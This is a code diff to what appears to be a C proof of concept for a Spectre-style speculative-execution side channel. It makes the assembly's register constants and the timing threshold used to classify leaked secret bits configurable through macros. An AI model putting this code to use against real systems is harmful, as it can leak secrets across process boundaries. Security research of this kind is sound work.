@@ -26,6 +26,15 @@
 #define SECRET_SZ           19
 #define CACHE_HIT_THRESHOLD 79
 #define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
+#ifndef LOW_RCX
+#define LOW_RCX 4
+#endif
+#ifndef HIGH_RCX
+#define HIGH_RCX 2880
+#endif
+#ifndef CLASSIFIER_THRESHOLD
+#define CLASSIFIER_THRESHOLD 180
+#endif
 uint64_t array1_sz = 16;
 uint64_t check = 1;
 uint8_t unused1[64];
@@ -107,8 +116,8 @@ void victimFunc(uint64_t idx) {
       cmp %%r11d, %%eax
       jbe done
       movl     (%2),%%ebx
-      mov     $2880,%%rdx 
-      mov     $4,%%rcx   
+      movq    %6,%%rdx
+      movq    %7,%%rcx
       mov     $0,%%r10d
       cmp     %%ebx,%%r10d
       cmovne  %%rdx, %%rcx
@@ -123,7 +132,7 @@ void victimFunc(uint64_t idx) {
             nop
     )"
     : "+r"(b), "+r"(c), "+r"(s), "+r"(arr),"+r"(src),"+r"(t)
-    :
+    : "r"((uint64_t)HIGH_RCX), "r"((uint64_t)LOW_RCX)
     : "%r11", "%r15","%r10","%rcx", "%eax", "%ebx", "%ecx", "%rdx", "memory"
     );
 
@@ -178,7 +187,7 @@ int main(void) {
                 uint64_t access_time2 = start_time();
                 dummy();
                 uint64_t start = stop_time() - access_time2;
-                results[bit]=(start > 180)?1:0;
+                results[bit]=(start > CLASSIFIER_THRESHOLD)?1:0;
 
                printf("%d,%d \n", results[bit],start);
     }
